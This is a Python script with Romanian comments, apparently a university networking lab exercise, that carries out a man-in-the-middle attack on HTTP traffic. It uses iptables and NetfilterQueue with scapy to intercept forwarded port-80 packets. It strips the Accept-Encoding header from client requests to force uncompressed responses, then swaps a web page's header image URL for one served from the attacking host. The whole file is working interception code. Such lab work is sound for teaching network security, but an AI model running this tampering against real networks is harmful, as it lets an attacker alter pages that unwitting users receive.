import os
import threading
from functools import partial
from http.server import HTTPServer, SimpleHTTPRequestHandler

from netfilterqueue import NetfilterQueue as NFQ
from scapy.all import IP, TCP, Raw

# portul HTTP interceptat
HTTP_PORT = 80

# directorul cu imaginea de inlocuire
# luat din locatia relativa a scriptului ca sa nu depinda de
# unde e montat repo-ul in container (/elocal/r26bis-da-ne-semnal/www)
WWW_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "www")
ORIG_IMG = b"unibuc_fisiere/header.jpg" # stringul original din HTML 
# stringul nou 
NEW_IMG = b"http://198.7.0.3/hyra.jpg" # trebuie neaparat sa aiba aceeasi lungime ca img originala
assert len(NEW_IMG) == len(ORIG_IMG), (
    f"NEW_IMG ({len(NEW_IMG)}) trebuie sa aiba aceeasi lungime ca "
    f"ORIG_IMG ({len(ORIG_IMG)})"
) # enforce pentru lungimea stringurilor 

# daca un client trimite encoding gzip serverul raspunde comprimat si nu se mai poate modifica imaginea
# se face un replace in cererea clientului pentru a dezactiva compresia si a primi html in clar mereu
ENC_HDR = b"Accept-Encoding"
ENC_HDR_BROKEN = b"Accept-Encodyng"
assert len(ENC_HDR) == len(ENC_HDR_BROKEN)


# modificarile de payload pastrand lungimea
def modify_client2server(payload):
    # replace ul pentru dezactivarea imaginii (schimbarea propriu-zisa a cererii clientului astfel incat sa mearga)
    return payload.replace(ENC_HDR, ENC_HDR_BROKEN)
def modify_server2client(payload):
    # inlocuirea efectiva a imaginii din header atunci cand serverul ii raspunde clientului
    return payload.replace(ORIG_IMG, NEW_IMG)

# callback-ul pentru fiecare pachet din coada
def proceseaza(pachet):  # pachet de tip netfilterqueue.Packet
    octeti = pachet.get_payload()      # raw bytes = header IP + TCP + date
    scapy_packet = IP(octeti)
    tcp = scapy_packet[TCP]
    # directia mesajului: dport==80 -> cerere client -> server
    is_client2server = (tcp.dport == HTTP_PORT)
    # la fel ca in primul script, pt SYN (fara ACK) sau RST care nu au date nu se fac modificari
    # SYN = 0x02, ACK = 0x10, RST = 0x04
    if tcp.flags & 0x04 or (tcp.flags & 0x02 and not (tcp.flags & 0x10)):
        pachet.accept()
        return
    # pachet fara date deci nimic de modificat
    if not scapy_packet.haslayer(Raw) or len(scapy_packet[Raw].load) == 0:
        pachet.accept()
        return

    original = scapy_packet[Raw].load
    if is_client2server:
        new_payload = modify_client2server(original)
    else:
        new_payload = modify_server2client(original)
    # daca nu s-a schimbat nimic pachetul ramane la fel
    if new_payload == original:
        pachet.accept()
        return

    print(
        f"{'C->S' if is_client2server else 'S->C'} modificat "
        f"({len(original)} bytes)" # lungime pastrata
    )

    # inlocuirea payload-ului si recalcularea checksum-ului
    scapy_packet[Raw].load = new_payload
    del scapy_packet[IP].chksum
    del scapy_packet[TCP].chksum
    # set_payload merge DOAR pentru ca se pastreaza lungimea pachetului
    pachet.set_payload(bytes(scapy_packet))
    pachet.accept()


# server HTTP pe middle pentru imaginea de inlocuire
# fiindca imaginea e hardcodata http://198.7 ... trebuie sa se creeze un server HTTP simplu pentru furnizarea propriu-zisa
def start_image_server():
    handler = partial(SimpleHTTPRequestHandler, directory=WWW_DIR)
    handler.log_message = lambda *a, **k: None
    httpd = HTTPServer(("0.0.0.0", HTTP_PORT), handler)
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    print(f"[*] Servesc imaginea din {WWW_DIR} pe http://198.7.0.3:{HTTP_PORT}/")
    return httpd
start_image_server() # imaginea trebuie sa intre pe INPUt deci image serverul porneste inainte de schimbara traficului in FORWARD

# trimitem in coada 0 traficul HTTP forwardat
os.system(f"iptables -I FORWARD -p tcp --dport {HTTP_PORT} -j NFQUEUE --queue-num 0")
os.system(f"iptables -I FORWARD -p tcp --sport {HTTP_PORT} -j NFQUEUE --queue-num 0")
print(f"[*] Interceptez traficul TCP pe portul {HTTP_PORT} [CTRL-C pentru stop]")

queue = NFQ()
queue.bind(0, proceseaza)
try:
    queue.run()
except KeyboardInterrupt:
    print("\nStopping...")
finally:
    os.system(f"iptables -D FORWARD -p tcp --dport {HTTP_PORT} -j NFQUEUE --queue-num 0")
    os.system(f"iptables -D FORWARD -p tcp --sport {HTTP_PORT} -j NFQUEUE --queue-num 0")
    queue.unbind()
